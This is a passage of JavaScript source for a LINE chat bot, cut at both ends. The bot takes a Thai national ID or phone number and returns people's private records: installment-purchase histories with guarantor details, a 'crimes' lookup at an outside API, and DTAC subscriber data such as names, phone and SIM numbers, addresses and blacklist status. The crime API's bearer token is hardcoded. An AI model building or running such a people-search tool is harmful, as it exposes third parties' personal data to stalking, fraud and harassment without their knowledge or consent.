    } else if (node.type === 'text' || node.type === 'span') {
      node.color = ink(node.color, dark);
      if (node.type === 'text') {
        node.wrap = true;
        delete node.maxLines;
        if (node.text === reportBadge) node.color = palette.accent;
        if (emojiBudget.remaining > 0 && typeof node.text === 'string' && node.text !== reportBadge && node.text.trim() && !node.contents?.length) {
          const title = section === 'header' && !emojiBudget.title;
          const decorated = withIcon(node.text, title ? '📋' : labelIcon(node.text), 2000);
          if (decorated !== node.text) { node.text = decorated; emojiBudget.remaining--; }
          if (section === 'header') emojiBudget.title = true;
        }
      }
      if (Array.isArray(node.contents)) node.contents.forEach(child => component(child, section, false, emojiBudget));
    } else if (node.type === 'separator') {
      node.color = dark ? '#334E68' : '#D9E2EC';
    } else if (node.type === 'button') {
      const kind = semantic(node.color);
      if (node.style === 'primary') node.color = kind ? statusInk[kind][0] : palette.accent;
      else if (node.style === 'secondary') node.color = kind ? statusFill[kind][0] : '#E2E8F0';
      else node.color = ink(node.color || palette.accent, dark);
    }
    // Deliberately do not traverse action, quickReply, image, or video objects.
  }

  const constrainedHeader = node => !!node && (
    node.height != null || node.maxHeight != null || node.position === 'absolute' ||
    ['offsetTop', 'offsetBottom', 'offsetStart', 'offsetEnd'].some(key => node[key] != null) ||
    (Array.isArray(node.contents) && node.contents.some(constrainedHeader))
  );

  function container(node) {
    if (!node || typeof node !== 'object') return;
    if (node.type === 'carousel') {
      if (Array.isArray(node.contents)) node.contents.forEach(container);
      return;
    }
    if (node.type !== 'bubble') return;
    // Add an independent report caption without changing any result fields.
    const visibleTextLength = part => !part || typeof part !== 'object' ? 0 :
      (typeof part.text === 'string' ? part.text.length : 0) +
      (Array.isArray(part.contents) ? part.contents.reduce((total, child) => total + visibleTextLength(child), 0) : 0);
    const reportLength = ['header', 'body', 'footer'].reduce((total, section) => total + visibleTextLength(node[section]), 0);
    if (reportLength < 8000) {
      const badge = { type: 'text', text: reportBadge, color: palette.accent, size: 'xxs', weight: 'bold', wrap: true };
      if (!node.header) node.header = { type: 'box', layout: 'vertical', paddingAll: '16px', contents: [badge] };
      else if (node.header.layout === 'vertical' && !constrainedHeader(node.header) &&
        Array.isArray(node.header.contents) && !node.header.contents.some(child => child.text === reportBadge)) {
        node.header.contents.unshift(badge);
        if (!node.header.spacing) node.header.spacing = 'sm';
      }
    }
    const visibleIcons = part => !part || typeof part !== 'object' ? 0 :
      iconCount(part.type === 'text' || part.type === 'span' ? part.text || '' : '') +
      (Array.isArray(part.contents) ? part.contents.reduce((total, child) => total + visibleIcons(child), 0) : 0);
    // Leave extra room for LINE's Flex JSON limit on very large cards.
    const emojiBudget = { remaining: reportLength >= 8000 ? 0 : Math.max(0, 3 - ['header', 'body', 'footer'].reduce((total, section) => total + visibleIcons(node[section]), 0)), title: false };
    node.styles = node.styles || {};
    for (const section of ['header', 'body', 'footer']) {
      if (!node[section]) continue;
      node.styles[section] = { ...node.styles[section], backgroundColor: palette[section] };
      component(node[section], section, true, emojiBudget);
    }
  }
  container(result.contents);
  return result;
}

// Split display text before styling; request batching belongs to reply/push.
function prepareNectMessages(messages) {
  const clone = value => {
    if (Array.isArray(value)) return value.map(clone);
    if (!value || typeof value !== 'object') return value;
    return Object.fromEntries(Object.entries(value).map(([key, item]) => [key, clone(item)]));
  };
  const prepared = [];
  for (const message of Array.isArray(messages) ? messages : [messages]) {
    const original = clone(message);
    if (original?.type !== 'text') {
      prepared.push(styleNectMessage(original));
      continue;
    }
    if (typeof original.text !== 'string') throw new TypeError('LINE text must be a string');
    const text = original.text;
    const spans = [];
    const addSpan = (entry, length) => {
      if (!Number.isInteger(entry.index) || !Number.isInteger(length) || length < 1 ||
          entry.index < 0 || entry.index + length > text.length) {
        throw new RangeError('Invalid LINE text metadata span');
      }
      if (length > 4900) throw new RangeError('LINE text metadata span exceeds chunk length');
      spans.push({ start: entry.index, end: entry.index + length });
    };
    for (const emoji of original.emojis || []) addSpan(emoji, emoji.length ?? 1);
    for (const mention of original.mention?.mentionees || []) addSpan(mention, mention.length);
    const safeBoundary = index => {
      const previous = text.charCodeAt(index - 1);
      const next = text.charCodeAt(index);
      return !(previous >= 0xD800 && previous <= 0xDBFF && next >= 0xDC00 && next <= 0xDFFF) &&
        !spans.some(span => span.start < index && index < span.end);
    };
    const chunks = [];
    let start = 0;
    do {
      let end = Math.min(start + 4900, text.length);
      while (end > start && !safeBoundary(end)) end--;
      if (end <= start && start < text.length) throw new RangeError('Cannot split LINE text metadata safely');
      if (end < text.length) {
        let newline = text.lastIndexOf('\n', end - 1);
        while (newline >= start && !safeBoundary(newline + 1)) newline = text.lastIndexOf('\n', newline - 1);
        if (newline >= start) end = newline + 1;
      }
      const chunk = clone(original);
      chunk.text = text.slice(start, end);
      if (chunks.length) delete chunk.quoteToken;
      if (end < text.length) delete chunk.quickReply;
      if (original.emojis?.length) {
        chunk.emojis = original.emojis.filter(emoji => emoji.index >= start && emoji.index < end)
          .map(emoji => ({ ...emoji, index: emoji.index - start }));
        if (!chunk.emojis.length) delete chunk.emojis;
      }
      if (original.mention?.mentionees?.length) {
        const mentionees = original.mention.mentionees
          .filter(mention => mention.index >= start && mention.index < end)
          .map(mention => ({ ...mention, index: mention.index - start }));
        if (mentionees.length) chunk.mention = { ...clone(original.mention), mentionees };
        else delete chunk.mention;
      }
      chunks.push(chunk);
      start = end;
    } while (start < text.length);
    for (const chunk of chunks) {
      const styled = styleNectMessage(chunk);
      if (styled?.type !== 'text' || typeof styled.text !== 'string' || styled.text.length > 5000) {
        throw new RangeError('Styled LINE text exceeds the 5000 character limit');
      }
      prepared.push(styled);
    }
  }
  return prepared;
}

async function reply(replyToken, messages) {
  let finalMessages = messages;
  const auditMember = SEARCH_AUDIT_CONTEXT.get(replyToken);
  if (auditMember) {
    finalMessages = addSearchAudit(finalMessages, auditMember);
    SEARCH_AUDIT_CONTEXT.delete(replyToken);
  }
  const prepared = prepareNectMessages(finalMessages);
  const target = NECT_REPLY_RECIPIENTS.get(replyToken);
  if (prepared.length > 5 && !target) throw new Error('Cannot send a complete report without its recipient context');
  const response = await client.replyMessage({ replyToken, messages: prepared.slice(0, 5) });
  for (let offset = 5; offset < prepared.length; offset += 5) {
    await client.pushMessage({ to: target, messages: prepared.slice(offset, offset + 5) });
  }
  return response;
}

async function push(to, messages) {
  const prepared = prepareNectMessages(messages);
  let response;
  for (let offset = 0; offset < prepared.length; offset += 5) {
    const current = await client.pushMessage({ to, messages: prepared.slice(offset, offset + 5) });
    if (offset === 0) response = current;
  }
  return response;
}

async function getProfile(userId) {
  try {
    const resp = await axios.get(`https://api.line.me/v2/bot/profile/${userId}`, {
      headers: {
        Authorization: `Bearer ${CHANNEL_ACCESS_TOKEN}`
      }
    });
    return resp.data;
  } catch (e) {
    console.error('getProfile error:', e?.response?.data || e.message);
    return {
      userId,
      displayName: 'ไม่ทราบชื่อ'
    };
  }
}

async function notifyAdminsUserCommand(userId, text) {
  const profile = await getProfile(userId);

  const msg =
    ` มีสมาชิกใช้คำสั่ง

ชื่อไลน์:
${profile.displayName || '-'}

UID:
${userId}

ข้อความที่ส่งมา:
${text}

ตอบกลับสมาชิก:
send#${userId}#ข้อความที่ต้องการส่ง`;

  for (const adminId of ADMIN_IDS) {
    await push(adminId, {
      type: 'text',
      text: msg
    });
  }
}

async function downloadLineImage(messageId, savePath) {
  const resp = await axios.get(
    `https://api-data.line.me/v2/bot/message/${messageId}/content`,
    {
      responseType: 'stream',
      headers: {
        Authorization: `Bearer ${CHANNEL_ACCESS_TOKEN}`
      }
    }
  );

  await new Promise((resolve, reject) => {
    const writer = fs.createWriteStream(savePath);
    resp.data.pipe(writer);
    writer.on('finish', resolve);
    writer.on('error', reject);
  });
}

async function fetchInstallment(nationId) {
  const resp = await axios.post(
    INSTALLMENT_API_URL,
    {
      id: nationId,
      ref: 'cus_nation_id',
      staffid: 8571,
      shopid: 225
    },
    {
      headers: {
        'Content-Type': 'application/json'
      },
      timeout: 30000
    }
  );

  return resp.data;
}

async function fetchSiamInstallment(nationId) {
  const url =
    `${DXC_BACKUP_API_BASE}?siam=${encodeURIComponent(nationId)}&key=${encodeURIComponent(SEARCH_API_KEY)}`;

  const resp = await axios.get(url, {
    headers: {
      Accept: 'application/json, text/plain, */*',
      'Accept-Language': 'th-TH,th;q=0.9,en;q=0.8',
      'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36'
    },
    timeout: 30000
  });

  return resp.data;
}

function splitSiamAddress(address) {
  const text = String(address || '')
    .replace(/ตำบล/g, 'ต.')
    .replace(/อำเภอ/g, 'อ.')
    .replace(/จังหวัด/g, 'จ.')
    .trim();

  if (!text || text === '-') return ['-'];

  const tambonIndex = text.indexOf('ต.');
  const changwatIndex = text.indexOf('จ.');

  if (tambonIndex > 0 && changwatIndex > tambonIndex) {
    return [
      text.slice(0, tambonIndex).trim(),
      text.slice(tambonIndex, changwatIndex).trim(),
      text.slice(changwatIndex).trim()
    ];
  }

  if (tambonIndex > 0) {
    return [
      text.slice(0, tambonIndex).trim(),
      text.slice(tambonIndex).trim()
    ];
  }

  return [text];
}

function formatSiamInstallment(data, pid) {
  if (!data || data.success !== true || !data.data) {
    return `❌ ไม่พบข้อมูลการผ่อนสินค้าสำหรับเลขบัตร ${pid}`;
  }

  const { hirer = {}, installment_history = [] } = data.data;

  if (!Array.isArray(installment_history) || installment_history.length === 0) {
    return " ▸ รายการประวัติผ่อนสินค้า\n\n❌ ไม่พบประวัติการผ่อนสินค้า";
  }

  const sv = (value, fallback = '-') => {
    if (value === null || value === undefined) return fallback;
    const text = String(value).trim();
    return text ? text : fallback;
  };

  const lines = [" ▸ รายการประวัติผ่อนสินค้า", "  "];

  lines.push("▸ รายละเอียดผู้เช่าซื้อ");
  lines.push(`  Name: ${sv(hirer.name)}`);
  lines.push(`  ID: ${sv(hirer.id, pid)}`);
  lines.push("  ");

  installment_history.forEach((item, index) => {
    const isLast = index === installment_history.length - 1;
    const branch = isLast ? "• " : "• ";
    const guarantor = item.guarantor || {};

    lines.push(`${branch}  ประวัติผ่อนสินค้า ลำดับที่ ${sv(item.seq, index + 1)}`);
    lines.push(`  วันที่ขาย: ${sv(item.sale_date)}`);
    lines.push(`  วันที่เริ่มสัญญา: ${sv(item.contract_start_date)}`);
    lines.push(`  วันที่งวดสุดท้าย: ${sv(item.last_installment_date)}`);
    lines.push(`  ผู้เช่าซื้อ: ${sv(item.hirer)}`);
    lines.push(`◇ หมายเลขโทรศัพท์
  ${sv(item.phone)}`);
    lines.push(`◇ หมายเลขโทรศัพท์เพิ่มเติม
  ${sv(item.other_phone)}`);
    lines.push("  ");
    lines.push(`${branch}  ที่อยู่ปัจจุบัน / ที่อยู่ลงสินค้า`);

    splitSiamAddress(item.current_address).forEach((addrLine) => {
      lines.push(`  ${addrLine}`);
    });

    lines.push("  ");
    lines.push(`${branch}  ▸ รายละเอียดผู้ค้ำประกัน`);
    lines.push(`ผู้ค้ำ: ${sv(guarantor.name)}`);
    lines.push(`ID: ${sv(guarantor.id)}`);
    lines.push(`◇ หมายเลขโทรศัพท์
  ${sv(guarantor.phone)}`);
    lines.push(`ความสัมพันธ์: ${sv(guarantor.relationship)}`);

    if (!isLast) lines.push("  ");
  });

  return limitLineMessage(lines.join('\n'));
}

function formatSiamInstallmentFlex(data, pid) {
  if (!data || data.success !== true || !data.data) {
    return {
      type: 'text',
      text: `❌ ไม่พบข้อมูลการผ่อนสินค้าสำหรับเลขบัตร ${pid}`
    };
  }

  const {
    hirer = {},
    installment_history = []
  } = data.data;

  if (
    !Array.isArray(installment_history) ||
    installment_history.length === 0
  ) {
    return {
      type: 'text',
      text: " ▸ รายการประวัติผ่อนสินค้า\n\n❌ ไม่พบประวัติการผ่อนสินค้า"
    };
  }

  const sv = (value, fallback = '-') => {
    if (value === null || value === undefined) return fallback;

    const text = String(value).trim();

    return text ? text : fallback;
  };

  const bubbles = installment_history
    .slice(0, 10)
    .map((item, index) => {

      const guarantor = item.guarantor || {};

      const addressLines =
        splitSiamAddress(item.current_address);

      const addressText =
        Array.isArray(addressLines) && addressLines.length
          ? addressLines.join('\n')
          : '-';

      return {
        type: 'bubble',
        size: 'mega',

        header: {
          type: 'box',
          layout: 'vertical',
          backgroundColor: '#0F172A',
          paddingAll: '18px',

          contents: [
            {
              type: 'text',
              text: ` ประวัติผ่อนสินค้า ${index + 1}`,
              color: '#FFFFFF',
              weight: 'bold',
              size: 'lg'
            },
            {
              type: 'text',
              text: `ลำดับที่ ${sv(item.seq, index + 1)}`,
              color: '#CBD5E1',
              size: 'sm',
              margin: 'sm'
            }
          ]
        },

        body: {
          type: 'box',
          layout: 'vertical',
          paddingAll: '18px',
          spacing: 'md',

          contents: [

            // =========================
            // ผู้เช่าซื้อ
            // =========================
            {
              type: 'text',
              text: " ▸ รายละเอียดผู้เช่าซื้อ",
              weight: 'bold',
              size: 'md',
              color: '#0F172A'
            },

            {
              type: 'text',
              text:
                `◇ ชื่อที่ระบุ
  ${sv(item.hirer || hirer.name)}\n` +
                `ID: ${sv(hirer.id, pid)}\n` +
                `◇ หมายเลขโทรศัพท์
  ${sv(item.phone)}\n` +
                `◇ หมายเลขโทรศัพท์เพิ่มเติม
  ${sv(item.other_phone)}`,
              wrap: true,
              size: 'sm',
              color: '#334155'
            },

            {
              type: 'separator',
              margin: 'md'
            },

            // =========================
            // สัญญา
            // =========================
            {
              type: 'text',
              text: " ▸ รายละเอียดของสัญญา",
              weight: 'bold',
              size: 'md',
              color: '#0F172A',
              margin: 'md'
            },

            {
              type: 'text',
              text:
                `วันที่ขาย: ${sv(item.sale_date)}\n` +
                `วันที่เริ่มสัญญา: ${sv(item.contract_start_date)}\n` +
                `วันที่งวดสุดท้าย: ${sv(item.last_installment_date)}`,
              wrap: true,
              size: 'sm',
              color: '#334155'
            },

            {
              type: 'separator',
              margin: 'md'
            },

            // =========================
            // ที่อยู่
            // =========================
            {
              type: 'text',
              text: " ที่อยู่ปัจจุบัน / ที่อยู่ลงสินค้า",
              weight: 'bold',
              size: 'md',
              color: '#0F172A',
              margin: 'md',
              wrap: true
            },

            {
              type: 'text',
              text: addressText,
              wrap: true,
              size: 'sm',
              color: '#334155'
            },

            {
              type: 'separator',
              margin: 'md'
            },

            // =========================
            // ผู้ค้ำ
            // =========================
            {
              type: 'text',
              text: " ▸ รายละเอียดผู้ค้ำประกัน",
              weight: 'bold',
              size: 'md',
              color: '#0F172A',
              margin: 'md'
            },

            {
  type: 'text',
  text:
    `ผู้ค้ำ: ${sv(guarantor.name)}\n` +
    `ID: ${sv(guarantor.id)}\n` +
    `◇ หมายเลขโทรศัพท์
  ${sv(guarantor.phone)}\n` +
    `ความสัมพันธ์: ${sv(guarantor.relationship)}`,
  wrap: true,
  size: 'sm',
  color: '#334155'
}
          ]
        },

        // =========================
        // ปุ่มคัดลอกข้อมูล
        // =========================
        footer: {
          type: 'box',
          layout: 'vertical',
          paddingAll: '16px',

          contents: [
            {
              type: 'button',
              style: 'primary',
              height: 'sm',
              color: '#0F172A',

              action: {
                type: 'clipboard',
                label: 'คัดลอกข้อมูล',

                clipboardText:
                  `🛍️ ประวัติผ่อนสินค้า ${index + 1}\n` +
                  `ลำดับที่: ${sv(item.seq, index + 1)}\n\n` +

                  `👤 ข้อมูลผู้เช่าซื้อ\n` +
                  `ชื่อ: ${sv(item.hirer || hirer.name)}\n` +
                  `ID: ${sv(hirer.id, pid)}\n` +
                  `เบอร์: ${sv(item.phone)}\n` +
                  `เบอร์อื่น: ${sv(item.other_phone)}\n\n` +

                  `📄 ข้อมูลสัญญา\n` +
                  `วันที่ขาย: ${sv(item.sale_date)}\n` +
                  `วันที่เริ่มสัญญา: ${sv(item.contract_start_date)}\n` +
                  `วันที่งวดสุดท้าย: ${sv(item.last_installment_date)}\n\n` +

                  `📍 ที่อยู่ปัจจุบัน / ที่อยู่ลงสินค้า\n` +
                  `${addressText}\n\n` +

                  `🤝 ข้อมูลผู้ค้ำประกัน\n` +
                  `ผู้ค้ำ: ${sv(guarantor.name)}\n` +
                  `ID: ${sv(guarantor.id)}\n` +
                  `เบอร์: ${sv(guarantor.phone)}\n` +
                  `ความสัมพันธ์: ${sv(guarantor.relationship)}`
              }
            }
          ]
        }
      };
    });

  return {
    type: 'flex',
    altText: `▸ รายการประวัติผ่อนสินค้า${installment_history.length} รายการ`,

    contents: {
      type: 'carousel',
      contents: bubbles
    }
  };
}

async function fetchCrime(nationId) {
  const url = 'https://kingkong-shark.com/KINGKONG/API_CRIMES.php';

  const headers = {
    Authorization: 'Bearer 80cca6be-acb2-4e33-8f91-a588a2e8a584',
    'Content-Type': 'application/json'
  };

  const resp = await axios.post(
    url,
    {
      keyword: nationId
    },
    {
      httpsAgent,
      headers,
      timeout: 30000
    }
  );

  return resp.data;
}

function formatInstallment(data) {
  if (!data || !data.status || !data.data) {
    return '❌ ไม่พบข้อมูลผ่อนสินค้า';
  }

  const p = data.data.person || {};
  const addresses = Array.isArray(data.data.addresses) ? data.data.addresses : [];

  const phones = new Set();

  if (p.mobile) {
    phones.add(p.mobile);
  }

  addresses.forEach(addr => {
    if (addr.tel && addr.tel !== '-' && addr.tel !== '') {
      phones.add(addr.tel);
    }
  });

  const safe = (v, fallback = 'N/A') => {
    if (v === null || v === undefined || v === '') return fallback;
    return String(v);
  };

  // 🎯 แปลงวันเกิดเป็นไทย
  const formatThaiBirth = (dateStr) => {
    if (!dateStr) return 'N/A';
    const d = new Date(dateStr);
    const th = d.toLocaleDateString('th-TH', {
      year: 'numeric',
      month: 'long',
      day: 'numeric'
    });
    return `${th} (${dateStr})`;
  };

  // 🎯 ย่อที่อยู่
  const shortAddr = (a) => {
    if (!a || !a.full_address) return '-';
    return a.full_address
      .replace(/ตำบล/g, 'ต.')
      .replace(/อำเภอ/g, 'อ.')
      .replace(/จังหวัด/g, 'จ.');
  };

  const homes = addresses.filter(a =>
  ['HOME','COHOME'].includes((a.type || '').toUpperCase())
);

const works = addresses.filter(a =>
  ['WORK','COWORK'].includes((a.type || '').toUpperCase())
);

  const accountStatus = safe(p.is_active) === 'YES'
    ? " ใช้งานอยู่"
    : " ไม่ใช้งาน";

  const totalAddr = homes.length + works.length;

  let msg = `[${safe(p.nationid)}]\n`;
  msg += `• Name: ${safe(p.fullname)}\n`;
  msg += `• ID: ${safe(p.nationid)}\n`;
  msg += `◇ วันเดือนปีเกิด
  ${formatThaiBirth(p.birth)}\n`;
  msg += `◇ ข้อมูลสถานะสมรส
  ${safe(p.marital_status)}\n`;
  msg += `◇ สถานะของบัญชี
  ${accountStatus}\n`;
  msg += `◇ หมายเลขโทรศัพท์ที่บันทึก
  
`;

  if (phones.size) {
    Array.from(phones).forEach((ph, i) => {
      msg += `  ├ ${ph}\n`;
    });
  } else {
    msg += `  └ ไม่พบข้อมูล
`;
  }
  msg += `◇ ที่อยู่อีเมล
  ${safe(p.email)}\n`;
  msg += `• Line ID: ${safe(p.lineid)}\n`;
  msg += `◇ วันจัดทำข้อมูล
  ${safe(p.created_at)}\n`;
  msg += `◇ เวลาที่ติดต่อครั้งล่าสุด
  ${safe(p.updated_at)}\n`;

  if (totalAddr > 0) {
    msg += `
 [ที่อยู่ ${totalAddr} รายการ]\n\n`;

    homes.forEach((h, i) => {
      msg += `• HOME [${i + 1}]:\n${shortAddr(h)}\n`;
    });

    works.forEach((w, i) => {
      msg += `• WORK [${i + 1}]:\n${shortAddr(w)}\n`;
    });
  }

  return msg.trim();
}

function formatDtacSearch(res, query) {
  const result = res?.data?.data?.data?.body?.result ||
    res?.data?.data?.body?.result || res?.data?.body?.result ||
    res?.body?.result || res?.result;
  if (!result) {
    return '❌ ไม่พบข้อมูล';
  }

  // New DTAC API schema (data.body.result.data/detail).
  if (result.data || result.detail) {
    const d = result.data || {};
    const detail = result.detail || {};
    const subscriberList = Array.isArray(d.listSubscriberByID)
      ? d.listSubscriberByID
      : [];

    // ID-search response: subscriber details are nested in listSubscriberByID.
    if (subscriberList.length) {
      let msg = `[ ${query} ] [DTAC]\n`;
      msg += ` ID: ${detail.idCheck?.idNumber || query}\n`;
      msg += ` เบอร์ที่พบ: ${subscriberList.length} รายการ\n\n`;
      msg += subscriberList.map((item, index) => {
        const subscriber = item?.subscriber || {};
        const name = [subscriber.firstname, subscriber.lastname]
          .filter(Boolean).join(' ') || '-';
        const status = String(subscriber.status || '').toUpperCase() === 'A'
          ? '✅ Active'
          : (subscriber.status || '-');
        return `${index + 1}. ${subscriber.subscriberNumber || '-'}\n` +
          `◇ ชื่อที่ระบุ
  ${name}\n` +
          `   ประเภท: ${subscriber.telephoneType || '-'}\n` +
          `   อายุการใช้งาน: ${subscriber.aouText || '-'}\n` +
          `   สถานะ: ${status}\n` +
          `   วันหมดสัญญา: ${item.contractEndDay ?? 0} วัน`;
      }).join('\n\n');

      const blackList = detail.idCheck?.blackListTrue || [];
      if (blackList.length) {
        msg += `

 Blacklist: ${blackList.map(item =>
          `${item.banType || '-'} (${(item.banId || []).join(', ') || '-'})`
        ).join(', ')}`;
      }
      return msg.trim();
    }

    const customerInfo = detail.customerInfo || {};
    const nbtc = detail.nbtc || {};
    const deviceItems = (detail.deviceSim?.deviceSIM || [])
      .map(item => typeof item === 'string' ? item : item?.value)
      .filter(Boolean);
    const name = [d.customerTitle, d.customerFirstName, d.customerLastName]
      .filter(Boolean).join(' ') || customerInfo.name || '-';
    const type = /prepaid|เติมเงิน/i.test(`${d.subscriberType} ${d.fromPackageGroupType}`)
      ? 'เติมเงิน' : 'รายเดือน';
    const status = String(d.subscriberStatus || '').toUpperCase() === 'A' ? '✅ Active' : (d.subscriberStatus || '-');
    const packageItems = Array.isArray(d.mainPackages) ? d.mainPackages : [];
    const packageText = packageItems.length
      ? packageItems.map(p => `• ${p.description || '-'}`).join('\n')
      : "• ไม่พบแพ็กเกจหลัก";
    const startDate = d.switchOnDate ? d.switchOnDate.split('-').reverse().join('/') : '-';
    let msg = `[ ${query} ] [DTAC]\n`;
    msg += ` Name: ${name}\n`;
    msg += ` ID: ${d.customerIDNumber || detail.idCheck?.idNumber || '-'}\n\n`;
    msg += `◇ หมายเลขสมาชิก
  ${d.customerNumber || d.subscriberNumber || '-'}\n`;
    msg += `◇ สถานะในระบบ
  ${d.subscriberStatus || '-'}\n`;
    msg += `◇ กลุ่มของลูกค้า
  ${detail.segment?.segment || '-'}\n\n`;
    msg += ` ▸ รายละเอียดซิมโทรศัพท์
• ประเภท: ${type}\n`;
    msg += `• อายุการใช้งาน: ${d.aouText || '-'}\n`;
    msg += `• เปิดใช้งาน: ${d.switchOnDate || '-'}\n`;
    msg += `• สถานะ: ${status}\n\n`;
    msg += ` Main Package
${packageText}\n`;
    if (packageItems[0]?.startDateTime) msg += `• เริ่มใช้งาน: ${packageItems[0].startDateTime}\n`;
    msg += `
 SIM Number: ${d.simCardNumber || '-'}\n\n`;
    msg += `✅ NBTC: ${nbtc.result || '-'}\n`;
    if (deviceItems.length) msg += `
 Device/Sim
${deviceItems.map((v, i) => `${i === deviceItems.length - 1 ? '●' : '●'} ${v}`).join('\n')}`;
    return msg.trim();
  }

  const userData = result.userData || {};
  const simData = result.simData || {};
  const deviceData = result.deviceData || {};
  const subscribers = {
    prepaid: Array.isArray(result.subscribers?.prepaid) ? result.subscribers.prepaid : [],
    postpaid: Array.isArray(result.subscribers?.postpaid) ? result.subscribers.postpaid : []
  };
  const hasSubscriberList = subscribers.prepaid.length > 0 || subscribers.postpaid.length > 0;
  const searchType = String(result.searchType || '').trim().toLowerCase();
  const isIdSearch = searchType === 'id' || hasSubscriberList;

  const sep = "────────────";

  let msg = ` [${query}]\n${sep}\n`;
  msg += `◇ ชื่อและนามสกุล
  ${userData.NameSurname || '-'}\n`;
  msg += `◇ หมายเลขบัตร
  ${userData.IDNumber || '-'}\n`;

  if (isIdSearch) {

    if (subscribers.prepaid.length > 0) {
      msg += `
 เบอร์เติมเงิน (Prepaid):
`;
      subscribers.prepaid.forEach((item, i) => {
        msg += `${i + 1}.${item.number || '-'} (${item.aou || '-'})\n`;
      });
    }

    if (subscribers.postpaid.length > 0) {
      msg += `
 เบอร์รายเดือน (Postpaid):
`;
      subscribers.postpaid.forEach((item, i) => {
        msg += `${i + 1}.${item.number || '-'} (${item.aou || '-'})\n`;
      });
    }

    if (subscribers.prepaid.length === 0 && subscribers.postpaid.length === 0) {
      msg += `\n❌ ไม่พบเบอร์ที่จดทะเบียน\n`;
    }

    msg += sep;
  } else {
    msg += `${sep}\n`;
    msg += `• ประเภท: ${simData.type || '-'}\n`;
    msg += `◇ จำนวนเงินคงเหลือ
  ${simData.Balance || '-'}\n`;
    msg += `• วันหมดอายุ: ${simData.ExpireTime || '-'}\n`;
    msg += `◇ วันเปิดใช้งานหมายเลข
  ${simData.StartDate || '-'}\n`;

    if (deviceData.deviceSimList && deviceData.deviceSimList.length > 0) {
      msg += `
 ▸ รายละเอียดอุปกรณ์และซิม
`;
      deviceData.deviceSimList.forEach((item, i, arr) => {
        if (i === 0) {
          msg += `• ${item}\n`;
        } else if (i === arr.length - 1) {
          msg += `• ${item}\n`;
        } else {
          msg += `• ${item}\n`;
        }
      });
    }

    msg += sep;
  }

  return msg.trim();
}

function formatDtacSearchFlex(res, query) {

  const result =
    res?.data?.data?.data?.body?.result ||
    res?.data?.data?.body?.result ||
    res?.data?.body?.result ||
    res?.body?.result ||
    res?.result;

  if (!result) {
    return {
      type: 'text',
      text: '❌ ไม่พบข้อมูล'
    };
  }

  if (result.data || result.detail) {

    const d = result.data || {};
    const detail = result.detail || {};

    const subscriberList =
      Array.isArray(d.listSubscriberByID)
        ? d.listSubscriberByID
        : [];


    // =====================================================
    // CASE 1 : ค้นด้วยเลขบัตร 13 หลัก
    // =====================================================

    if (subscriberList.length) {

      const blackList =
        Array.isArray(detail.idCheck?.blackListTrue)
          ? detail.idCheck.blackListTrue
          : [];

      const bubbles = subscriberList
        .slice(0, 10)
        .map((item, index) => {

          const subscriber =
            item?.subscriber || {};

          const name = [
            subscriber.firstname,
            subscriber.lastname
          ]
            .filter(Boolean)
            .join(' ') || '-';

          const status =
            String(subscriber.status || '').toUpperCase() === 'A'
              ? '✅ Active'
              : (subscriber.status || '-');

          const rawNumber =
            subscriber.subscriberNumber || '-';

          // ถ้าเป็น 66xxxxxxxxx ให้แสดงเป็น 0xxxxxxxxx
          const displayNumber =
            /^66\d+$/.test(String(rawNumber))
              ? `0${String(rawNumber).slice(2)}`
              : rawNumber;

          const blacklistText =
            blackList.length
              ? blackList.map(item => {
                  const ids =
                    Array.isArray(item.banId)
                      ? item.banId.join(', ')
                      : '-';

                  return `${item.banType || '-'} (${ids || '-'})`;
                }).join('\n')
              : 'ไม่พบ';

          return {
            type: 'bubble',
            size: 'mega',

            header: {
              type: 'box',
              layout: 'vertical',
              backgroundColor: '#0F172A',
              paddingAll: '18px',

              contents: [
                {
                  type: 'text',
                  text: ` DTAC รายการ ${index + 1}`,
                  color: '#FFFFFF',
                  weight: 'bold',
                  size: 'lg'
                },

                {
                  type: 'text',
                  text: displayNumber,
                  color: '#38BDF8',
                  weight: 'bold',
                  size: 'xl',
                  margin: 'sm'
                }
              ]
            },

            body: {
              type: 'box',
              layout: 'vertical',
              paddingAll: '18px',
              spacing: 'md',

              contents: [

                {
                  type: 'text',
                  text: " ข้อมูลสมาชิก",
                  weight: 'bold',
                  size: 'md',
                  color: '#0F172A'
                },

                {
                  type: 'text',
                  text:
                    `◇ ชื่อที่ระบุ
  ${name}\n` +
                    `ID: ${detail.idCheck?.idNumber || query}`,
                  wrap: true,
                  size: 'sm',
                  color: '#334155'
                },

                {
                  type: 'separator',
                  margin: 'md'
                },

                {
                  type: 'text',
                  text: " ข้อมูลหมายเลข",
                  weight: 'bold',
                  size: 'md',
                  color: '#0F172A',
                  margin: 'md'
                },

                {
                  type: 'text',
                  text:
                    `หมายเลข: ${displayNumber}\n` +
                    `ประเภท: ${subscriber.telephoneType || '-'}\n` +
                    `อายุการใช้งาน: ${subscriber.aouText || '-'}\n` +
                    `สถานะ: ${status}\n` +
                    `วันหมดสัญญา: ${item.contractEndDay ?? 0} วัน`,
                  wrap: true,
                  size: 'sm',
                  color: '#334155'
                },

                {
                  type: 'separator',
                  margin: 'md'
                },

                {
                  type: 'text',
                  text: " Blacklist",
                  weight: 'bold',
                  size: 'md',
                  color: '#B91C1C',
                  margin: 'md'
                },

                {
                  type: 'text',
                  text: blacklistText,
                  wrap: true,
                  size: 'sm',
                  color: '#475569'
                }
              ]
            },

            footer: {
              type: 'box',
              layout: 'vertical',
              paddingAll: '16px',

              contents: [
                {
                  type: 'button',
                  style: 'primary',
                  height: 'sm',

                  action: {
                    type: 'clipboard',
                    label: 'คัดลอกข้อมูล',

                    clipboardText:
                      `DTAC\n` +
                      `ID: ${detail.idCheck?.idNumber || query}\n` +
                      `หมายเลข: ${displayNumber}\n` +
                      `ชื่อ: ${name}\n` +
                      `ประเภท: ${subscriber.telephoneType || '-'}\n` +
                      `อายุการใช้งาน: ${subscriber.aouText || '-'}\n` +
                      `สถานะ: ${status}\n` +
                      `วันหมดสัญญา: ${item.contractEndDay ?? 0} วัน\n` +
                      `Blacklist: ${blacklistText}`
                  }
                }
              ]
            }
          };
        });


      return {
        type: 'flex',
        altText: `DTAC พบ ${subscriberList.length} หมายเลข`,

        contents: {
          type: 'carousel',
          contents: bubbles
        }
      };
    }


    // =====================================================
    // CASE 2 : ค้นด้วยเบอร์ 10 หลัก
    // =====================================================

    const customerInfo =
      detail.customerInfo || {};

    const nbtc =
      detail.nbtc || {};

    const deviceItems =
      (detail.deviceSim?.deviceSIM || [])
